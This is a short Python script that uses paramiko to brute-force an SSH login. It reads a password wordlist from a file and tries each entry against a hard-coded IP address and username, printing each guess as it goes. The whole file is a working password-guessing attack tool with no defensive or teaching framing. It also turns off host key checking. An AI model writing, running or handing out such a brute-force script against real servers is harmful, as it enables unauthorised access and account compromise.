import paramiko
import sys
import time
## EDIT SSH DETAILS ##

SSH_ADDRESS = "3.140.238.122"
SSH_USERNAME = "hernandez"
SSH_PASSWORD = "password"


## CODE BELOW ##

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh_stdin = ssh_stdout = ssh_stderr = None

with open("hernandez.txt") as infile:
    data = infile.read().splitlines()

for item in data:
    if item:
        time.sleep(2)
        print(f"trying {item}")
        SSH_PASSWORD = item
        try:
            ssh.connect(SSH_ADDRESS, username=SSH_USERNAME, password=SSH_PASSWORD)
            print(f"something happend with {item}")
        except Exception as e:
            sys.stderr.write("SSH connection error: {0}".format(e))

        if ssh_stdout:
            sys.stdout.write(ssh_stdout.read())
        if ssh_stderr:
            sys.stderr.write(ssh_stderr.read())